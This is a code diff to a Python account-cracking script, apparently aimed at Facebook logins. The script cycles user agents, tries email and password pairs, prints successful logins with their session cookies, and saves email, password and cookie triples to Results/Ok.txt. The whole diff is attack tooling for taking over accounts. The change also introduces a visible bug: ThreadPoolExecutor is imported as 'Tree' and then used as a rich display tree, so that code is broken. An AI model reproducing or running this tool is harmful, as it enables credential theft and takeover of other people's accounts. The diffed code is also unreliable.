@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
-import requests,json,os,sys,random,datetime,time,re
+import requests,json,os,random,datetime,time,re
+from concurrent.futures import ThreadPoolExecutor as Tree
 from concurrent.futures import ThreadPoolExecutor
 from rich.panel import Panel
 from rich import print
@@ -8,9 +9,9 @@ from rich.console import Console
 from rich.columns import Columns
 from rich.panel import Panel as panel
 from rich.console import Console as sol
-try:ugen = open('user.txt','r').read().splitlines()
+try:ugen = open('ua.txt','r').read().splitlines()
 except:ugen = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
-try:ugen2 = open('user2.txt','r').read().splitlines()
+try:ugen2 = open('ua.txt','r').read().splitlines()
 except:ugen2 = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
 
 
@@ -384,7 +385,7 @@ class crack:
                         try:
                             self.cookie = (";".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))
                         except:pass
-                        tree = tree("\r[bold white]LOGIN SUCCESS                      ", style = "bold white")
+                        tree = Tree("\r[bold white]LOGIN SUCCESS                      ", style = "bold white")
                         tree.add(f"[bold green]Email : {email}").add(f"[bold green]Password : {pws}", style = "bold white")
                         tree.add(f"[bold green]Cookie : {self.cookie}", style = "bold white")
                         print(tree)
@@ -392,7 +393,7 @@ class crack:
                         open('Results/Ok.txt', 'a+').write(f'{email}|{pws}|{self.cookie}\n')
                         break
                     elif 'checkpoint' in r.cookies.get_dict().keys():
-                        tree = tree("\r[bold white]LOGIN CHECKPOINT                      ", style = "bold white")
+                        tree = Tree("\r[bold white]LOGIN CHECKPOINT                      ", style = "bold white")
                         tree.add(f"[bold red]Email : {email}").add(f"[bold red]Password : {pws}", style = "bold white")
                         tree.add(f"[bold red]Useragent : {self.useragent}", style = "bold white")
                         print(tree)
